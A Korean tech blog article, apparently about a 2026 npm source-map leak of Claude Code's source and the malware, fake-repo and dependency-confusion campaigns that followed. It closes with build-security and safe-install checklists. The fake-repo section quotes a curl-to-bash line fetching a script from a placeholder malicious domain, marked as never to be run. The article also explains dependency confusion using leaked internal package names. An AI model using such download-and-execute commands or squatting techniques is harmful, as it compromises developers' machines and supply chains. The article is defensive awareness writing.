2026년 3월 31일, AI 개발 도구 업계에서 전례 없는 사건이 발생했다. Anthropic이 자사의 플래그십 AI 코딩 에이전트인 Claude Code의 소스코드를 npm 패키지 배포 과정에서 실수로 공개해버린 것이다. 단순한 빌드 설정 오류 하나가 약 1,884개의 TypeScript + React 소스 파일을 전 세계에 노출시켰고, 그 여파는 아직도 진행형이다.

---

## 1. 사건의 발단 — 소스맵 하나가 모든 것을 바꿨다

### Bun 빌드 설정의 치명적 실수

사건의 시작은 놀랍도록 단순했다. `@anthropic-ai/claude-code` npm 패키지의 v2.1.88 버전에 `cli.js.map`이라는 파일이 함께 배포된 것이다. 이 파일 하나가 이 모든 사태의 원흉이었다.

Claude Code는 내부적으로 Bun 런타임을 사용해 빌드된다. Bun은 JavaScript/TypeScript 런타임이자 번들러로, 빠른 빌드 속도로 각광받고 있다. 그런데 Bun의 빌드 설정에서 `sourcemap` 옵션이 잘못 구성된 채로 프로덕션 빌드에 포함된 것으로 추정된다.

정상적인 빌드 파이프라인이라면 다음과 같이 소스맵을 비활성화하거나 외부 파일로만 생성하더라도 npm 패키지에서 제외해야 한다:

```javascript
// bun build 설정 예시
await Bun.build({
  entrypoints: ['./src/cli.ts'],
  outdir: './dist',
  sourcemap: 'none',  // 프로덕션에서는 반드시 none 또는 external
  minify: true,
});
```

또한 `.npmignore` 혹은 `package.json`의 `files` 필드로 `.map` 파일을 배포 대상에서 제외했어야 한다. 이 두 가지 안전장치 모두 작동하지 않았다.

### 소스맵(Source Map)이란 무엇인가

소스맵이 왜 이렇게 위험한지 이해하려면 먼저 소스맵이 무엇인지 알아야 한다.

현대 JavaScript/TypeScript 프로젝트는 배포 전에 **트랜스파일(transpile)**, **번들링(bundling)**, **난독화(minification)** 과정을 거친다. 이 과정에서 원본 코드는 사람이 읽기 어려운 형태로 변환된다. 예를 들어 변수명 `userAuthentication`은 `a`로, `processPaymentRequest`는 `b`로 바뀔 수 있다.

소스맵은 이 변환된 코드와 원본 소스 코드 사이의 **매핑 정보**를 담은 파일이다. 개발 중에는 Chrome DevTools나 VS Code 디버거가 소스맵을 읽어 압축된 코드에서도 원본 파일명, 라인 번호, 변수명을 그대로 보여준다. 즉, 개발자 경험(DX)을 위한 도구다.

문제는 이 소스맵 파일이 원본 소스코드 전체를 담고 있다는 것이다. `.map` 파일을 열면 다음과 같은 JSON 구조를 볼 수 있다:

```json
{
  "version": 3,
  "sources": ["src/agent/core.ts", "src/tools/bash.ts", ...],
  "sourcesContent": ["// 원본 TypeScript 코드 전체 내용...", ...],
  "mappings": "AAAA,IAAI,..."
}
```

`sourcesContent` 필드에 **원본 소스 파일의 전체 내용**이 문자열로 인코딩되어 있다. 즉, `cli.js.map` 파일 하나에서 원본 TypeScript 파일 1,884개를 그대로 복원할 수 있었다.

### "실수"였지만 파급력이 컸던 이유

Anthropic 입장에서는 분명 단순한 실수였을 것이다. 그런데 왜 이렇게 파급력이 컸을까?

첫째, **npm은 한 번 배포하면 즉시 전파된다.** CDN 캐싱, 미러링, 자동 다운로드 등으로 인해 취약한 버전이 배포된 순간 이미 전 세계에 복사본이 퍼져나간다. 삭제한다고 해도 이미 다운로드된 복사본까지 회수할 수는 없다.

둘째, **Claude Code는 엄청난 사용자 기반을 가지고 있다.** 매일 수만 명의 개발자가 업데이트를 받는 인기 패키지에서 이런 사고가 났으니, 노출 범위가 극대화된 것이다.

셋째, **커뮤니티 반응이 빨랐다.** 보안 연구자들과 개발자들은 새 버전이 배포되면 즉시 내용을 분석하는 경우가 많다. 이상한 파일이 포함된 것을 몇 시간 내에 발견했고, 순식간에 코드 분석이 진행됐다.

## 2. 유출된 것들 — 마법은 없었다

### 1,884개 파일이 말해주는 것

복원된 소스코드는 방대했다. TypeScript와 React로 작성된 약 1,884개의 파일. 이는 단순한 스크립트 모음이 아니라 수년간 수십 명의 엔지니어가 쌓아온 복잡한 코드베이스였다.

파일 수만으로도 규모를 짐작할 수 있다. 일반적인 중소 규모 웹 서비스가 수백 개의 파일로 구성된다는 점을 감안하면, 1,884개는 상당히 큰 코드베이스다. 특히 CLI 도구에 React가 사용된 것도 눈길을 끌었는데, 이는 터미널 UI를 React 컴포넌트 방식으로 렌더링하는 [Ink](https://github.com/vadimdemedes/ink) 같은 라이브러리를 활용했을 가능성이 높다.

### 코드네임 "tengu" (天狗)

유출된 코드에서 발견된 흥미로운 사실 중 하나는 내부 코드네임이 **"tengu"(天狗)**라는 것이었다. 천구는 일본 신화에 등장하는 산의 정령으로, 날카로운 부리(혹은 긴 코)를 가진 반인반조(半人半鳥) 형태의 존재다. 인간보다 뛰어난 능력을 가졌지만 어딘가 인간적이기도 한 존재.

AI 코딩 에이전트에 이 이름을 붙인 것은 의미심장하다. 인간 개발자보다 빠르고 정확하게 코드를 작성하지만, 본질적으로는 인간의 지시를 따르는 도구라는 자기 인식이 담겨 있는 것일까? 아니면 단순히 멋있어서? 우리는 알 수 없다.

### 아키텍처의 핵심 — 파일 기반 Mailbox 시스템

기술적으로 가장 주목할 만한 발견은 에이전트 팀 통신 방식이었다. Claude Code는 여러 에이전트가 협업할 때 **파일 기반 Mailbox 시스템**을 사용한다.

```
~/.claude/teams/{team}/inboxes/{agent}.json
```

각 에이전트는 자신의 인박스 JSON 파일을 갖고, 다른 에이전트나 시스템이 이 파일에 메시지를 작성하는 방식으로 통신한다. 파일 잠금(proper-lockfile)을 사용해 동시성 문제를 해결했다.

이 설계는 놀랍도록 단순하다. 분산 메시지 큐, 복잡한 RPC 시스템, 소켓 통신 없이 그냥 JSON 파일이다. "왜 이렇게 복잡한 걸 안 쓰지?"라는 생각이 들 수도 있지만, 이 접근법에는 명확한 장점이 있다. 디버깅이 쉽고, 상태를 언제든 파일로 확인할 수 있으며, 프로세스 간 의존성이 낮다.

### "마법이 없었다" — 그것이 진짜 교훈

커뮤니티에서 가장 많이 회자된 반응은 이것이었다: **"Claude Code의 마법은 없었다."**

많은 개발자들이 Claude Code가 어떤 신비로운 기술로 동작할 것이라고 상상했다. 혁신적인 추론 엔진, 특별한 코드 이해 알고리즘, 독자적인 에이전트 프로토콜... 하지만 유출된 코드는 그런 기대를 산산조각 냈다.

핵심은 **프롬프트 엔지니어링**과 **에이전트 루프 설계**였다. 어떤 도구를 언제 호출하고, 실패했을 때 어떻게 재시도하며, 컨텍스트를 어떻게 관리하는지 — 이런 것들을 정교하게 설계한 것이 Claude Code의 진짜 경쟁력이었다.

이것이 실망스러운 소식일까? 꼭 그렇지는 않다. 오히려 이는 아키텍처보다 **사용자 경험에 대한 깊은 이해**와 **반복적인 개선**이 더 중요하다는 것을 보여준다. "마법"처럼 느껴지는 것들은 대부분 수많은 엣지 케이스를 다루는 세심한 엔지니어링의 결과물이다.

동시에, 이 발견은 AI 에이전트 분야가 아직 '무엇을 시스템 프롬프트에 넣느냐'가 핵심인 단계임을 보여준다. 모델 자체의 능력을 얼마나 잘 끌어내느냐가 제품의 품질을 좌우한다.

## 3. 즉각적인 후폭풍 — 악의적 행위자들의 신속한 반응

### 악성코드 캠페인의 세 가지 벡터

코드 유출 소식이 퍼지는 것과 거의 동시에, 악의적 행위자들이 이 혼란을 이용하기 시작했다.

**① SEO 포이즈닝 (InstallFix 캠페인)**

구글에 "Claude Code install", "Claude Code download", "Claude Code npm" 같은 키워드로 검색하면 상단에 광고 형태로 가짜 설치 사이트가 등장하기 시작했다. 이 사이트들은 Anthropic 공식 사이트와 유사하게 디자인되었으며, 제공하는 설치 명령어는 실제 Claude Code가 아닌 악성코드를 설치한다.

특히 위험한 것은 개발자들의 습관이다. 많은 개발자들이 검색 결과에서 설치 명령어를 찾아 **확인 없이 터미널에 붙여넣는다.** 이 습관이 공격자들이 노리는 벡터다.

**② GitHub 가짜 저장소 (GitHub Bait)**

"Claude Code Enterprise Edition", "Claude Code Unlocked", "Claude Code Free Premium" 같은 이름의 GitHub 저장소들이 빠르게 생겨났다. 유출된 소스코드를 실제로 포함하면서 "기업용 기능 무료 해제"나 "API 키 없이 사용 가능" 같은 미끼 문구로 개발자들을 유혹했다.

이런 저장소의 `README.md`에는 다음과 같은 설치 명령이 포함되어 있다:

```bash
# 절대 실행하지 마세요
curl -fsSL https://악성-사이트.com/install.sh | bash
```

**③ VS Code 확장 프로그램 사칭**

VS Code 마켓플레이스에 "Claude Code Assistant", "Claude AI Coder" 같은 이름의 악성 확장 프로그램들이 등록됐다. 설치하면 **Vidar 인포스틸러**와 **GhostSocks 프록시 악성코드**가 함께 설치된다.

Vidar는 브라우저 저장 비밀번호, 크리덴셜, 암호화폐 지갑 정보를 훔치는 인포스틸러다. GhostSocks는 감염된 기기를 SOCKS5 프록시로 만들어 공격자들이 익명 트래픽 라우팅에 활용한다. 개발자 PC는 특히 매력적인 타겟인데, 회사 인프라 접근 권한, API 키, SSH 키 등 고가치 정보를 담고 있기 때문이다.

### 공급망 공격 준비 — Dependency Confusion

더 교묘한 위협도 포착됐다. 공격자들이 유출된 코드에서 발견한 **내부 의존성 패키지 이름**을 npm에 미리 등록하는 행위다.

유출 코드에서 발견된 내부 패키지명:
- `audio-capture-napi`
- `url-handler-napi`

이것들은 Anthropic 내부에서만 사용하는 네이티브 애드온(napi) 패키지로, 공개 npm 레지스트리에는 존재하지 않았다. 공격자들은 이 이름으로 악성 패키지를 npm에 등록했다.

이것이 **Dependency Confusion** 공격이다. npm, pip 등 패키지 매니저는 같은 이름의 패키지가 공개 레지스트리와 내부 레지스트리 양쪽에 존재할 때, 종종 **더 높은 버전 번호**를 가진 공개 레지스트리 패키지를 우선적으로 선택한다. 공격자가 악성 패키지를 99.0.0 같은 높은 버전으로 등록하면, Anthropic의 빌드 파이프라인이 내부 패키지 대신 악성 패키지를 자동으로 받아올 수 있다.

2021년 Alex Birsan이 이 기법을 공개 연구로 발표했을 때 Apple, Microsoft, PayPal 등 대형 기업들이 모두 취약했던 것이 밝혀진 바 있다. Anthropic도 이 위협에서 예외가 아니다.

### 개발자를 위한 긴급 주의사항

지금 당장 지켜야 할 수칙:

1. **구글에서 Claude Code 설치 방법을 검색했다면, 검색 결과 상단의 광고 링크를 클릭하지 말것.** 반드시 `claude.ai` 또는 `anthropic.com` 공식 도메인을 직접 방문하라.

2. **터미널에 붙여넣기 전에 반드시 확인하라.** `curl ... | bash` 패턴은 특히 위험하다.

3. **VS Code 확장 프로그램은 공식 Anthropic 계정에서 배포되는 것만 설치하라.** 다운로드 수, 리뷰, 배포자 인증을 확인하라.

4. **이미 의심스러운 것을 설치했다면:** 즉시 해당 PC의 모든 API 키, 비밀번호를 갱신하고, 관련 서비스에서 세션을 로그아웃하라.

## 4. 더 큰 파장 — 생태계의 지각변동

### OpenClaude의 탄생

유출 사건은 역설적으로 오픈소스 생태계에 새로운 불씨를 지폈다. 유출된 소스코드를 기반으로 **OpenClaude** 프로젝트가 등장했다. 이 프로젝트는 Claude Code의 인터페이스와 에이전트 루프를 차용하면서 백엔드 모델을 교체할 수 있도록 했다.

GPT-4o, Gemini, Ollama를 포함해 200개 이상의 모델을 지원한다고 알려진 OpenClaude는 출시 즉시 GitHub에서 수천 개의 스타를 받았다. 특히 비용에 민감한 개발자들이나 오픈소스 모델을 선호하는 사람들에게 큰 관심을 받았다.

이는 AI 도구 생태계에서 매우 의미 있는 사건이다. 기존에는 Claude Code가 Anthropic의 독점적 제품으로, 다른 모델과 함께 사용할 방법이 없었다. 하지만 이제 Claude Code의 UX(사용자 경험)와 에이전트 설계를 다른 AI 모델과 결합하는 것이 가능해졌다.

물론 법적, 윤리적 문제는 별개다. 유출된 코드를 기반으로 한 프로젝트가 Anthropic의 저작권을 침해하는지 여부는 명확하지 않으며, 이에 대한 법적 논쟁이 이어질 가능성이 있다.

### Anthropic의 정책 변경 — 그리고 그 맥락

흥미롭게도, 이 사건과 거의 같은 시기에 Anthropic은 중요한 정책 변경을 발표했다. **2026년 4월 4일**, Anthropic은 **4월 6일부터 Claude.ai 구독을 OpenClaw 같은 서드파티 도구에서 사용할 수 없도록** 제한한다고 공지했다.

물론 Anthropic이 이 정책 변경의 이유를 소스코드 유출과 직접 연결짓지는 않았다. 하지만 타이밍과 맥락을 생각하면 무관하다고 보기 어렵다. 소스코드 유출로 경쟁 도구(OpenClaude)가 탄생했고, 이들이 Anthropic의 인프라를 활용하는 것을 막아야 할 동기가 생긴 것이다.

이 정책은 AI 도구 생태계 전반에 파장을 일으켰다. OpenClaw, Continue.dev, Cursor 등 Claude API를 활용하는 서드파티 도구들은 직접적인 영향을 받게 됐다. 일부 사용자들은 이를 Anthropic이 생태계를 자사 플랫폼으로 수직 통합하려는 시도로 해석했다.

AI 모델 제공사들이 점점 더 자사 도구와의 통합을 강화하는 추세는 이미 업계 전반에서 나타나고 있다. OpenAI의 ChatGPT, Anthropic의 Claude.ai, Google의 Gemini — 모두 독자적인 인터페이스와 에이전트 제품을 강화하고 있다. 단순히 API를 판매하는 것을 넘어 최종 사용자 경험 전체를 장악하려는 움직임이다.

### AI 툴 생태계가 배워야 할 교훈

이번 사건은 AI 도구 생태계 전반에 여러 교훈을 남겼다.

**프로프라이어터리 AI 도구의 취약성**: 아무리 잘 만든 도구라도 소스코드가 유출되면 경쟁 우위가 순식간에 사라질 수 있다. 코드 자체보다 **데이터, 파인튜닝, 생태계 네트워크 효과**가 진짜 해자(moat)임이 확인됐다.

**커뮤니티의 힘**: 수천 명의 개발자가 1,884개 파일을 며칠 만에 분석하고 공유했다. 오픈소스 커뮤니티의 집단지성은 어떤 내부 팀보다 빠르게 코드를 이해할 수 있다.

**보안은 개발 초기부터**: 소스맵 포함 여부 같은 기본적인 빌드 보안이 출시 직전 검토 프로세스에서 걸러지지 않았다는 것은, 보안을 '나중에 추가하는 것'이 아닌 개발 파이프라인의 기본으로 삼아야 한다는 교훈을 준다.

## 5. 기술적 교훈 — 실무자를 위한 체크리스트

### 소스맵 배포 시 주의사항

소스맵은 개발 편의를 위한 것이지 프로덕션 배포를 위한 것이 아니다. 하지만 많은 팀이 이를 간과한다. 다음 원칙을 지켜야 한다:

**절대 하지 말 것:**
- `sourcemap: 'inline'` 설정으로 프로덕션 빌드 — 소스맵이 번들 안에 base64로 포함된다
- `.map` 파일을 npm 패키지나 Docker 이미지에 포함
- CDN에 `.map` 파일 업로드 (에러 모니터링 서비스용 private 업로드는 예외)

**권장 사항:**
- `sourcemap: 'none'` 또는 Bun/webpack의 production 모드 기본값 활용
- `.npmignore` 또는 `package.json`의 `files` 필드로 명시적 화이트리스트 관리
- CI/CD 파이프라인에서 배포 패키지 내 `.map` 파일 존재 여부 검사 추가

### 빌드 파이프라인 보안 체크리스트

```bash
# CI/CD에 추가할 검사 예시 (bash)

# 1. npm 패키지에 .map 파일 포함 여부 검사
npm pack --dry-run 2>&1 | grep "\.map$" && {
  echo "ERROR: Source map files found in package!"
  exit 1
}

# 2. 빌드 아티팩트 크기 이상 감지
BUNDLE_SIZE=$(stat -c%s dist/cli.js)
MAX_SIZE=10485760  # 10MB
if [ $BUNDLE_SIZE -gt $MAX_SIZE ]; then
  echo "WARNING: Bundle size exceeds limit. Possible source map inclusion?"
fi

# 3. package.json files 필드 검증
node -e "
const pkg = require('./package.json');
if (!pkg.files) {
  console.error('ERROR: Missing files field in package.json');
  process.exit(1);
}
"
```

**팀 프로세스 개선:**
- 프로덕션 배포 전 패키지 내용 명시적 리뷰 단계 추가
- `npm pack`으로 실제 배포될 파일 목록 정기 점검
- 의존성 패키지명을 내부 네이밍 컨벤션과 분리 (Dependency Confusion 방지)
- 내부 패키지는 사설 레지스트리(Artifactory, GitHub Packages 등) 사용 및 스코핑

### AI 툴 설치 시 보안 수칙

AI 코딩 도구의 인기가 높아지면서 이를 노린 공격도 증가하고 있다. 다음 수칙을 습관화하라:

1. **공식 채널만 신뢰**: npm 패키지는 공식 패키지명(`@anthropic-ai/claude-code`)으로만 설치. 유사품 주의.

2. **설치 전 패키지 확인**: `npm info <패키지명>` 으로 배포자, 다운로드 수, 최근 업데이트 확인.

3. **`curl | bash` 패턴 지양**: 가능하면 패키지를 먼저 다운로드 후 내용 확인하고 실행.

4. **최소 권한 원칙**: AI 도구에 과도한 시스템 권한 부여 금지. 필요한 디렉토리만 접근 가능하도록.

5. **의존성 감사**: 주기적으로 `npm audit` 또는 `snyk test` 실행.

6. **업데이트 주의**: 메이저 버전 업데이트는 changelog를 반드시 확인 후 적용.

## 6. 마무리 — 아이러니, 그리고 그 너머

### AI 코딩 도구를 만드는 회사의 빌드 설정 실수

이 사건에는 씁쓸한 아이러니가 있다.

Anthropic은 **AI가 코드를 더 잘 작성하도록 돕는 도구**를 만드는 회사다. Claude Code는 "당신의 코드를 더 안전하고 빠르게"라는 가치를 제안한다. 그런데 정작 그 도구를 만드는 팀이 빌드 파이프라인의 기초적인 설정 실수를 범했다.

만약 Claude Code가 Anthropic의 자체 빌드 프로세스를 검토했다면, 소스맵 포함을 미리 경고했을까? 아이러니하게도 "AI 코딩 도구를 만들면서 정작 자기 코드는 AI로 검증 안 했나?"라는 농담이 커뮤니티에 돌기도 했다.

하지만 이것은 단순한 조롱이 아니라 진지한 질문이다. **개발 도구를 만드는 팀 자신의 개발 프로세스가 그 도구의 철학을 반영하는가?** 이 사건은 AI 도구 제공사들이 자기 자신의 '고객'이 되어 도구를 활용해야 한다는 것을 상기시켜준다.

모든 엔지니어는 실수한다. 설정 파일 하나, 플래그 하나가 이런 결과를 낳을 수 있다는 것은 Anthropic만의 문제가 아니다. npm 생태계의 특성상, 배포는 한 번 버튼을 누르면 돌이킬 수 없다. 이 사건이 주는 교훈은 "Anthropic이 나쁘다"가 아니라 "자동화된 안전장치 없이 수동 프로세스에만 의존하는 배포 파이프라인은 누구에게나 이런 사고를 낼 수 있다"는 것이다.

### 오픈소스 생태계에 미친 긍정적 영향

역설적으로, 이 사건은 AI 에이전트 개발 생태계에 몇 가지 긍정적인 영향도 남겼다.

**① AI 에이전트 아키텍처의 공개 논의 활성화**

유출 전까지는 "최고의 AI 에이전트를 어떻게 만드는가"에 대한 실질적인 레퍼런스가 부족했다. 이제 커뮤니티는 실제로 수천만 사용자에게 검증된 에이전트의 내부 설계를 분석하고 토론할 수 있게 됐다. 파일 기반 Mailbox 패턴, 에이전트 루프 설계, 도구 호출 관리 방식 등이 공개 논문이나 블로그 포스트보다 훨씬 실용적인 형태로 공개된 것이다.

**② 신화 해소**

"AI 코딩 에이전트는 뭔가 마법 같은 것이 있어야 한다"는 인식이 깨졌다. 이는 오히려 더 많은 개발자들에게 "나도 만들 수 있겠다"는 용기를 줬다. OpenClaude 외에도 여러 오픈소스 에이전트 프레임워크들이 이 분석을 참고해 개선되고 있다.

**③ 보안 의식 제고**

AI 도구 설치 시 보안에 대한 커뮤니티 전반의 인식이 높아졌다. "AI 도구라고 무조건 신뢰하면 안 된다", "설치 전 출처를 확인해야 한다"는 문화가 자리잡는 계기가 됐다.

### 에필로그

2026년 3월 31일, 어떤 Anthropic 엔지니어가 Bun 빌드 설정의 플래그 하나를 잘못 설정했다. 그 실수는 며칠 만에 소스코드 유출, 악성코드 캠페인, 새로운 오픈소스 프로젝트 탄생, 그리고 업계 전반의 정책 변화로 이어졌다.

기술의 세계에서 작은 설정 하나가 얼마나 큰 나비효과를 만들어내는지를 보여주는 사건이었다. 그리고 이는 동시에, 오픈소스 커뮤니티가 얼마나 빠르게 새로운 정보를 흡수하고 혁신으로 전환하는지를 보여주는 사례이기도 하다.

코드네임 "tengu" — 날카롭고 신비로운 산의 정령 — 는 이제 더 이상 신비롭지 않다. 그리고 어쩌면, 그것이 더 나은 미래의 출발점일지도 모른다.
